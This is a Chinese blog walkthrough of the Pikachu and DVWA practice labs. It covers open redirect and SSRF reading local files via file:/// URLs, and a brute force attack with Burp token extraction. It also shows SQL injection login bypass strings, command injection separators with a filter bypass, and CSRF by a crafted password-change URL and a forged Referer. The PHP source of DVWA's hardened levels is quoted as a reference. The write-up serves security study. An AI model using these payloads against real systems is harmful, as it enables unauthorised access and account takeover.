<p> 点击“我就是我，放荡不羁的我”网页也发生了跳转</p>
<p> <img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231559079.jpg" alt="img"></p>
<p> 多了一个url参数，既然是url，那试着修改为另一个网页，比如<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.bilibili.com,跳转到了bilibili网页端/" >http://www.bilibili.com，跳转到了bilibili网页端</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231559568.png" alt="image-20240523155959513"></p>

        <h1 id="SSRF"   >
          <a href="#SSRF" class="heading-link"><i class="fas fa-link"></i></a><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1>
      
        <h2 id="SSRF-curl"   >
          <a href="#SSRF-curl" class="heading-link"><i class="fas fa-link"></i></a><a href="#SSRF-curl" class="headerlink" title="SSRF(curl)"></a>SSRF(curl)</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231600089.png" alt="image-20240523160048059"></p>
<p>点击链接后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231601155.jpg" alt="img"></p>
<p>多了一个url参数，试着给url传入<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.baidu.com/" >http://www.baidu.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231601157.jpg" alt="img"></p>
<p>有访问到，再试试访问本地文件（先在pikachu目录下新建文本文档1.txt，写入123）,给url传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///D:/phpstudy_pro/WWW/pikachu/1.txt</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231601163.jpg" alt="img"></p>

        <h2 id="SSRF-file-get-content"   >
          <a href="#SSRF-file-get-content" class="heading-link"><i class="fas fa-link"></i></a><a href="#SSRF-file-get-content" class="headerlink" title="SSRF(file_get_content)"></a>SSRF(file_get_content)</h2>
      
        <h6 id="file-get-content函数-该函数的作用是读取文件的内容，可以对本地文件进行读取，也可以对远程文件进行读取"   >
          <a href="#file-get-content函数-该函数的作用是读取文件的内容，可以对本地文件进行读取，也可以对远程文件进行读取" class="heading-link"><i class="fas fa-link"></i></a><a href="#file-get-content函数-该函数的作用是读取文件的内容，可以对本地文件进行读取，也可以对远程文件进行读取" class="headerlink" title="file_get_content函数, 该函数的作用是读取文件的内容，可以对本地文件进行读取，也可以对远程文件进行读取"></a>file_get_content函数, 该函数的作用是读取文件的内容，可以对本地文件进行读取，也可以对远程文件进行读取</h6>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231602294.png" alt="image-20240523160219260"></p>
<p>点击链接</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231602944.jpg" alt="img"></p>
<p>url传入了file参数，可以和上一题一样试着传入百度的网址：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.baidu.com/" >http://www.baidu.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231602943.jpg" alt="img"></p>
<p>再试试访问本地文件,给url传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///D:/phpstudy_pro/WWW/pikachu/1.txt</span><br></pre></td></tr></table></div></figure>

<p>(已经将文档内容改为456)</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231602949.jpg" alt="img"></p>
<p>访问成功</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2024/05/19/DVWA%E9%9D%B6%E5%9C%BA/">DVWA-学习</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2024-05-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-05-27</span></span></div></header><div class="post-body"><div class="post-excerpt"><p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/05/dvwa.html#Low-2" >https://www.sqlsec.com/2020/05/dvwa.html#Low-2</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="一、暴力破解"   >
          <a href="#一、暴力破解" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、暴力破解" class="headerlink" title="一、暴力破解"></a>一、暴力破解</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405192112109.png" alt="image-20240519211247063"></p>

        <h2 id="Low"   >
          <a href="#Low" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low" class="headerlink" title="Low"></a>Low</h2>
      <p>随便输入一个账号密码登录，然后抓包发送到攻击器</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405191935953.png" alt="image-20240519193557877"></p>
<p>选好payload位置，开始暴力破解</p>
<p>最后爆破出来账号是admin 密码是password</p>
<p>看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405191938732.png" alt="image-20240519193820686"></p>
<p>可以看到只有一句简单的查询语句，也可以利用sql注入的漏洞，已知账号后在账号栏内输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;or&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></div></figure>

<p>或是</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;-- (注意后面还有一个空格)</span><br></pre></td></tr></table></div></figure>

<p>密码随意，也能成功登录</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405191941261.png" alt="image-20240519194158205"></p>

        <h2 id="Medium"   >
          <a href="#Medium" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2>
      <p>暴力破解也能破，但是查看源代码后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405192110071.png" alt="image-20240519211043996"></p>
<p>可以看到使用了<code>mysqli_real_escape_string</code>函数来防止SQL注入</p>
<p>所以到了中等难度时就必须得知道账号和密码才行</p>

        <h2 id="High"   >
          <a href="#High" class="heading-link"><i class="fas fa-link"></i></a><a href="#High" class="headerlink" title="High"></a>High</h2>
      <p>抓包后可以看到多了令牌</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405192118023.png" alt="image-20240519211856968"></p>
<p>而且提交之后令牌又发生了改变，之后该令牌值和页面提交一起传至服务端进行验证。服务端收到请求后，首先判断token的值是否合法，再进行sql查询</p>
<p>查看源代码发现</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201434435.png" alt="image-20240520143405390"></p>
<p>通过<code>checkToken</code>函数验证提交的表单中的<code>user_token</code>与会话中的<code>session_token</code>是否一致。这有助于防止跨站请求伪造攻击，代码在每次请求结束时通过<code>generateSessionToken</code>函数刷新CSRF令牌，以增强会话的安全性。</p>
<p>使用stripslashes去除转义字符，防止转义字符影响 SQL 查询的语法，尤其是在使用旧的 PHP 版本或配置不当的服务器上；并且数据清洗，在将数据存储到数据库之前，去除不必要的转义，以确保数据的准确性和预期的处理。</p>

        <h6 id="有token时的burpsuite暴力破解"   >
          <a href="#有token时的burpsuite暴力破解" class="heading-link"><i class="fas fa-link"></i></a><a href="#有token时的burpsuite暴力破解" class="headerlink" title="有token时的burpsuite暴力破解"></a>有token时的burpsuite暴力破解</h6>
      <p>抓包发送到Intruder后，将username、password、user_token进行<code>add$</code>操作，然后选择交叉攻击（假如有两个标志位置，那么发起攻击后进行攻击的顺序为a1,b1、a2,b2…）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201414105.png" alt="image-20240520141424996"></p>
<p>再在“选项”里找到Grep-Extract，点击“添加”，再点击“获取响应”后选择token</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201418002.png" alt="image-20240520141815942"></p>
<p>复制这个token，点击“确认”</p>
<p>重定向选择“总是”</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201418199.png" alt="image-20240520141856172"></p>
<p>资源池设置线程为1（不支持多线程）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201419517.png" alt="image-20240520141949457"></p>
<p>“payload”里前两个依次设置对应好，第3个payload集类型为递归提取，并把复制的token粘贴刀初始payload</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201420588.png" alt="image-20240520142052542"></p>
<p>开始攻击</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201422809.png" alt="image-20240520142212762"></p>
<p>成功</p>

        <h2 id="Impossible"   >
          <a href="#Impossible" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Login&#x27; ] ) &amp;&amp; isset ($_POST[&#x27;username&#x27;]) &amp;&amp; isset ($_POST[&#x27;password&#x27;]) ) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class="line"></span><br><span class="line">    // Sanitise username input</span><br><span class="line">    $user = $_POST[ &#x27;username&#x27; ];</span><br><span class="line">    $user = stripslashes( $user );</span><br><span class="line">    $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">    // Sanitise password input</span><br><span class="line">    $pass = $_POST[ &#x27;password&#x27; ];</span><br><span class="line">    $pass = stripslashes( $pass );</span><br><span class="line">    $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">    // Default values</span><br><span class="line">    $total_failed_login = 3;</span><br><span class="line">    $lockout_time       = 15;</span><br><span class="line">    $account_locked     = false;</span><br><span class="line"></span><br><span class="line">    // Check the database (Check user information)</span><br><span class="line">    $data = $db-&gt;prepare( &#x27;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#x27; );</span><br><span class="line">    $data-&gt;bindParam( &#x27;:user&#x27;, $user, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">    $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    // Check to see if the user has been locked out.</span><br><span class="line">    if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $row[ &#x27;failed_login&#x27; ] &gt;= $total_failed_login ) )  &#123;</span><br><span class="line">        // User locked out.  Note, using this method would allow for user enumeration!</span><br><span class="line">        //echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;</span><br><span class="line"></span><br><span class="line">        // Calculate when the user would be allowed to login again</span><br><span class="line">        $last_login = strtotime( $row[ &#x27;last_login&#x27; ] );</span><br><span class="line">        $timeout    = $last_login + ($lockout_time * 60);</span><br><span class="line">        $timenow    = time();</span><br><span class="line"></span><br><span class="line">        /*</span><br><span class="line">        print &quot;The last login was: &quot; . date (&quot;h:i:s&quot;, $last_login) . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">        print &quot;The timenow is: &quot; . date (&quot;h:i:s&quot;, $timenow) . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">        print &quot;The timeout is: &quot; . date (&quot;h:i:s&quot;, $timeout) . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">        */</span><br><span class="line"></span><br><span class="line">        // Check to see if enough time has passed, if it hasn&#x27;t locked the account</span><br><span class="line">        if( $timenow &lt; $timeout ) &#123;</span><br><span class="line">            $account_locked = true;</span><br><span class="line">            // print &quot;The account is locked&lt;br /&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Check the database (if username matches the password)</span><br><span class="line">    $data = $db-&gt;prepare( &#x27;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27; );</span><br><span class="line">    $data-&gt;bindParam( &#x27;:user&#x27;, $user, PDO::PARAM_STR);</span><br><span class="line">    $data-&gt;bindParam( &#x27;:password&#x27;, $pass, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">    $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    // If its a valid login...</span><br><span class="line">    if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) &#123;</span><br><span class="line">        // Get users details</span><br><span class="line">        $avatar       = $row[ &#x27;avatar&#x27; ];</span><br><span class="line">        $failed_login = $row[ &#x27;failed_login&#x27; ];</span><br><span class="line">        $last_login   = $row[ &#x27;last_login&#x27; ];</span><br><span class="line"></span><br><span class="line">        // Login successful</span><br><span class="line">        echo &quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;&#123;$user&#125;&lt;/em&gt;&lt;/p&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;</span><br><span class="line"></span><br><span class="line">        // Had the account been locked out since last login?</span><br><span class="line">        if( $failed_login &gt;= $total_failed_login ) &#123;</span><br><span class="line">            echo &quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;p&gt;Number of login attempts: &lt;em&gt;&#123;$failed_login&#125;&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;&#123;$last_login&#125;&lt;/em&gt;.&lt;/p&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Reset bad login count</span><br><span class="line">        $data = $db-&gt;prepare( &#x27;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#x27; );</span><br><span class="line">        $data-&gt;bindParam( &#x27;:user&#x27;, $user, PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // Login failed</span><br><span class="line">        sleep( rand( 2, 4 ) );</span><br><span class="line"></span><br><span class="line">        // Give the user some feedback</span><br><span class="line">        echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in &#123;$lockout_time&#125; minutes&lt;/em&gt;.&lt;/pre&gt;&quot;;</span><br><span class="line"></span><br><span class="line">        // Update bad login count</span><br><span class="line">        $data = $db-&gt;prepare( &#x27;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#x27; );</span><br><span class="line">        $data-&gt;bindParam( &#x27;:user&#x27;, $user, PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Set the last login time</span><br><span class="line">    $data = $db-&gt;prepare( &#x27;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#x27; );</span><br><span class="line">    $data-&gt;bindParam( &#x27;:user&#x27;, $user, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>

<p>用POST方法传入参数，比较安全</p>
<p>同样通过<code>checkToken</code>函数验证提交的表单中的<code>user_token</code>与会话中的<code>session_token</code>是否一致。这有助于防止跨站请求伪造攻击，代码在每次请求结束时通过<code>generateSessionToken</code>函数刷新CSRF令牌，以增强会话的安全性。</p>
<p>同样，用户名和密码通过<code>stripslashes</code>和<code>mysqli_real_escape_string</code>进行处理，以避免SQL注入攻击。</p>
<p>密码在存储前同样使用<code>md5</code>进行了散列处理。</p>

        <h6 id="关键：通过跟踪用户失败的登录尝试次数来防止暴力破解攻击。如果失败次数超过3次，账户将被锁定15分钟"   >
          <a href="#关键：通过跟踪用户失败的登录尝试次数来防止暴力破解攻击。如果失败次数超过3次，账户将被锁定15分钟" class="heading-link"><i class="fas fa-link"></i></a><a href="#关键：通过跟踪用户失败的登录尝试次数来防止暴力破解攻击。如果失败次数超过3次，账户将被锁定15分钟" class="headerlink" title="关键：通过跟踪用户失败的登录尝试次数来防止暴力破解攻击。如果失败次数超过3次，账户将被锁定15分钟"></a>关键：通过跟踪用户失败的登录尝试次数来防止暴力破解攻击。如果失败次数超过3次，账户将被锁定15分钟</h6>
      <p>如果账户之前曾被锁定（即有暴力破解的迹象），用户将收到警告信息。</p>

        <h2 id="二、命令注入"   >
          <a href="#二、命令注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、命令注入" class="headerlink" title="二、命令注入"></a>二、命令注入</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201441479.png" alt="image-20240520144137454"></p>
<div class="table-container"><table>
<thead>
<tr>
<th>符号</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>A;B</td>
<td>A 不论正确与否都会执行 B 命令</td>
</tr>
<tr>
<td>A&amp;B</td>
<td>A 后台运行，A 和 B 同时执行</td>
</tr>
<tr>
<td>A&amp;&amp;B</td>
<td>A 执行成功时候才会执行 B 命令</td>
</tr>
<tr>
<td>A|B</td>
<td>A 执行的输出结果，作为 B 命令的参数，A 不论正确与否都会执行 B 命令</td>
</tr>
<tr>
<td>A||B</td>
<td>A 执行失败后才会执行 B 命令</td>
</tr>
</tbody></table></div>

        <h2 id="Low-1"   >
          <a href="#Low-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-1" class="headerlink" title="Low"></a>Low</h2>
      <p>即使不是IP地址也不会报错，可以输入一些简单的命令，比如</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;dir</span><br></pre></td></tr></table></div></figure>

<p>（加分号是让系统忽略之前的任何内容（如果有的话），并执行一个新的<code>dir</code>命令。）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201450526.png" alt="image-20240520145022497"></p>
<p>输入|ehco “ls”</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201502820.png" alt="image-20240520150201793"></p>
<p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201450722.png" alt="image-20240520145047683"></p>
<p>对输入没有进行验证</p>
<p>而且使用<code>php_uname(&#39;s&#39;)</code>获取当前服务器的操作系统名称，如果返回的字符串包含”Windows NT”（即使用的是Windows系统，执行ping命令），所以在Windows系统下查看文件目录命令应该是dir</p>

        <h2 id="Medium-1"   >
          <a href="#Medium-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h2>
      <p>此时输入;dir没有返回信息，但是输入|dir能正常输出，说明是把“;”过滤了</p>
<p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201504764.png" alt="image-20240520150403738"></p>
<p>有设置黑名单，过滤了“&amp;&amp;”和“;”，用其他符号比如&amp;、|、||代替即可</p>

        <h2 id="High-1"   >
          <a href="#High-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-1" class="headerlink" title="High"></a>High</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201505236.png" alt="image-20240520150542198"></p>
<p>对输入进行了更多的过滤，但是仔细看能发现第三个是过滤了| ，在管道符后面不加空格就能绕过</p>

        <h2 id="Impossible-1"   >
          <a href="#Impossible-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class="line"></span><br><span class="line">    // Get input</span><br><span class="line">    $target = $_REQUEST[ &#x27;ip&#x27; ];</span><br><span class="line">    $target = stripslashes( $target );</span><br><span class="line"></span><br><span class="line">    // Split the IP into 4 octects</span><br><span class="line">    $octet = explode( &quot;.&quot;, $target );</span><br><span class="line"></span><br><span class="line">    // Check IF each octet is an integer</span><br><span class="line">    if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123;</span><br><span class="line">        // If all 4 octets are int&#x27;s put the IP back together.</span><br><span class="line">        $target = $octet[0] . &#x27;.&#x27; . $octet[1] . &#x27;.&#x27; . $octet[2] . &#x27;.&#x27; . $octet[3];</span><br><span class="line"></span><br><span class="line">        // Determine OS and execute the ping command.</span><br><span class="line">        if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">            // Windows</span><br><span class="line">            $cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            // *nix</span><br><span class="line">            $cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Feedback for the end user</span><br><span class="line">        echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Ops. Let the user name theres a mistake</span><br><span class="line">        echo &#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>

<p>通过 <code>checkToken</code> 函数检查请求中的 CSRF 令牌与会话中的令牌是否匹配，以防止 CSRF 攻击。</p>
<p>获取用户输入的 IP 地址，并使用 <code>stripslashes</code> 函数去除可能的转义字符。</p>
<p>验证IP地址，被分割为四个部分（四个八位组），并检查每个部分是否为数字，并且确保只有四个八位组。</p>

        <h1 id="三、CSRF"   >
          <a href="#三、CSRF" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、CSRF" class="headerlink" title="三、CSRF"></a>三、CSRF</h1>
      
        <h2 id="Low-2"   >
          <a href="#Low-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-2" class="headerlink" title="Low"></a>Low</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201519277.png" alt="image-20240520151939239"></p>
<p>只要登录之后，输入改后的密码两次就能改掉密码，密码修改后能看到URL已经改变为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#</span><br></pre></td></tr></table></div></figure>

<p>因此只要让用户访问这个网址就可以把用户的密码成功修改</p>
<p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201523319.png" alt="image-20240520152343277"></p>
<p>使用GET方法传参，很容易被篡改，而且只是验证了两个新密码是否一致</p>

        <h2 id="Medium-2"   >
          <a href="#Medium-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201526098.png" alt="image-20240520152601070"></p>
<p>多加了一个验证，检查 HTTP 请求的来源（Referer）是否包含当前服务器的域名，常用于确定请求是否来自同一个网站</p>
<p>假如把修改后的URL复制到另一个网页，会显示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201542994.png" alt="image-20240520154252963"></p>
<p>在Repeater中添加Referer字段</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201542105.png" alt="image-20240520154228070"></p>
<p>发送后密码成功修改</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201541804.png" alt="image-20240520154119768"></p>

        <h2 id="High-2"   >
          <a href="#High-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-2" class="headerlink" title="High"></a>High</h2>
      <p>查看关键源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261023149.png" alt="image-20240526102255008"></p>
